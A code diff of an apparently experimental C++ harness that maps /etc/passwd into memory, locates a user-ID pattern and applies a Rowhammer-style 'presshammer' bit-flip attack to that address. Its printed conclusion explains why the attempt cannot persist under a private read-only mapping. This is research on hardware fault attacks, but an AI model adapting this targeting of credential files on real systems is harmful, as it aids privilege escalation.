@@ -1,19 +1,10 @@
 #include "content.h"
 
-namespace color {
-    constexpr const char* RESET  = "\033[0m";
-    constexpr const char* RED    = "\033[31m";
-    constexpr const char* GREEN  = "\033[32m";
-    constexpr const char* YELLOW = "\033[33m";
-    constexpr const char* BLUE   = "\033[34m";
-}
-
 
 int openCriticalFile(const char *filePath){
-    // opens in read-only mode because we do not have write permissions from userland
     int fd = open(filePath, O_RDONLY);
     if(fd == -1){
-        std::cerr << color::RED << "[!] " << color::RESET << "Error opening file: " << filePath << std::endl;
+        showErrorInfo("Error opening file: " + std::string(filePath));
         perror("open");
         close(fd);
         exit(EXIT_FAILURE);
@@ -23,90 +14,102 @@ int openCriticalFile(const char *filePath){
 }
 
 
-void showContent(const char *filePath, char *content){
-    std::cout << "\n" << "----------- " << color::RED << "Target file: " << filePath << color::RESET <<  " -----------" << '\n'
-    << "\n" << content << '\n'
-    << "--------------------------------------------" << "\n" << std::endl;
-
-}
-
-
 void checkContentFile(bool isDoubleSided){
-    std::cout << color::BLUE << "[*] " << color::RESET << "CHECK CONTENT FILE" << std::endl;
+    showInfo("CHECK CONTENT FILE");
 
-    //1. opens the critical file
+    // ========================================================================
+    // STEP 1. Open the critical file (e.g., /etc/passwd)
+    // ========================================================================
+    showStep(1, "Open the critical file");
+
     const char* filePath = "/etc/passwd";
     int fd = openCriticalFile(filePath);
+    showSuccessInfo("File: " + std::string(filePath) + " opened in read-only mode because we do not have write permissions from userland");
 
-
-    // obtains file size
     struct stat sb;
-
     if(fstat(fd, &sb) == -1){
-        std::cerr << color::RED << "[!] " << color::RESET << "Error getting file size: " << filePath << std::endl;
+        showErrorInfo("Error getting file size: " + std::string(filePath));
         perror("fstat");
         close(fd);
         exit(EXIT_FAILURE);
     }
 
 
-    //2. mapping in read-only and private mode (does not share changes with disk) 
-    // if you have write permissions you can use MAP_SHARED for synchronization with the disk but it means you are executing as root in this case
+    // ========================================================================
+    // STEP 2. Map the file into memory
+    // ========================================================================
+    showStep(2, "Map the file into memory");
+
+    // Map the file into memory in read-only and private mode (does not share changes with disk) but permissions.
+    // MAP_PRIVATE ensures the mapping is not shared and is only local to this process.
+    // This means any changes made to memory will not affect the actual file on disk 
     auto mappedTarget = (void*) mmap(nullptr, sb.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
     if (mappedTarget == MAP_FAILED){
-        std::cerr << color::RED << "[!] " << color::RESET << "mmap failed" << std::endl;
+        showErrorInfo("mmap failed");
         perror("mmap");
         exit(EXIT_FAILURE);
     }
+    volatile char *fileTargetAddress = (volatile char*) mappedTarget;
+    uintptr_t fileTarget = (uintptr_t) fileTargetAddress;
+
+    showSuccessAddress("/etc/passwd mapped in memory in read-only and private mode but permissions: ", fileTarget);
+
+    char *content = (char *) mappedTarget;
+    showContentInfo(content);
 
     
-    // gets uid content data and show it
-    char *content = (char *) mappedTarget;
-    showContent(filePath, content);
 
+    // ========================================================================
+    // STEP 3. Look for a specific pattern in the content (e.g., a user ID string)
+    // ========================================================================
+    showStep(3, "Look for a specific pattern in the content");
 
-    //3. gets uid address 
     const char *stringUid = "x:1000:";
     char *uidFound = std::strstr(content, stringUid);
     if(!uidFound){
-        std::cerr << color::RED << "[!] " << color::RESET << "Pattern not found" << std::endl;
+        showErrorInfo("Pattern not found");
         exit(EXIT_FAILURE);
     }
 
-    //4. gets target address
+    ptrdiff_t offset = uidFound - content;
     volatile char *uidTargetAddress = (volatile char*) uidFound;
-    volatile char *fileTargetAddress = (volatile char*) mappedTarget;
     uintptr_t uidTarget = (uintptr_t) uidTargetAddress;
-    uintptr_t fileTarget = (uintptr_t) fileTargetAddress;
+    
+    showSuccessInfo("Pattern " + std::string(stringUid) + " found at: " + std::to_string(offset));
+    showCriticalAddress("Pattern memory address (target): ", uidTarget);
+    
 
-    // show info
-    std::cout << "------------------- " << color::BLUE << "Info" << color::RESET << " -------------------" << "\n"
-    << color::BLUE << "[*] " << color::RESET << filePath << " memory address: " << std::hex << fileTarget << std::dec << "\n"
-    << color::BLUE << "[*] " << color::RESET << "Pattern " << stringUid << "found at: " << (uidFound - content) << "\n"
-    << color::BLUE << "[*] " << color::RESET << "Pattern memory address: " << std::hex << uidTarget << std::dec << "\n"
-    <<  "--------------------------------------------" << std::endl;
+    // ========================================================================
+    // STEP 4. Check if can apply presshammer
+    // ========================================================================
+    showStep(4, "Check if can apply presshammer");
 
-    // 5. attempt to apply presshammer
     if(isDoubleSided){
         doubleSidedPresshammer(uidTarget);
     }else{
         singleSidedPresshammer(uidTarget);
     }
+    showSuccessAddress("Hammered target address: ", uidTarget);
 
+    close(fd);
 
-    // CONLUSION
-    /* 
-    in this case, although we are pointing to real file content in memory (unlike the inode metadata),
-    the memory mapping is read-only and private (MAP_PRIVATE), which means:
     
-    - any modifications from userland would not be reflected back to the original file.
-    - even if bit flips were successful via presshammer, they would only affect the local memory space.
-    - in order to make permanent changes, we would need to:
-        1. Map the file with write permissions (requires root).
-        2. Use MAP_SHARED to synchronize memory changes to disk.
-        3. Call msync() or close() to flush modifications.
+
+    // ========================================================================
+    // CONCLUSION
+    // ========================================================================
+    showConclusion();
+    std::cout << "The key limitation in this scenario is the memory mapping mode (MAP_PRIVATE): \n"
+    << "- With MAP_PRIVATE, any changes made in memory will not be reflected back to the disk. \n"
+    << "- Even if bit flips or memory corruption occurs due to presshammer, these changes will only affect the memory space and not the actual file content on the disk. \n"
+    << "- Since we are mapping the file in read-only mode, we cannot make any changes to the original file content. \n" << std::endl;
     
-    therefore, as we lack the necessary privileges to write, the attack remains unfeasible. Not make sanse apply this attack to these cases.
-    */
+    std::cout << "To make permanent changes to the file, we would need: \n"
+    << "1. To map the file with write permissions (e.g., using MAP_SHARED | critical files requires root). \n"
+    << "2. To synchronize changes with the disk (using msync() or fsync()). \n" << std::endl;
+
+    std::cout << "Therefore, applying presshammer in this case only has a local effect on the memory of the process and cannot modify the actual file on disk. \n"
+    << "The attack is not feasible as the changes won't persist outside of memory, as we lack the necessary privileges to write, the attack remains unfeasible. Not make sanse apply this attack to these cases." << std::endl;
+    
 
 }
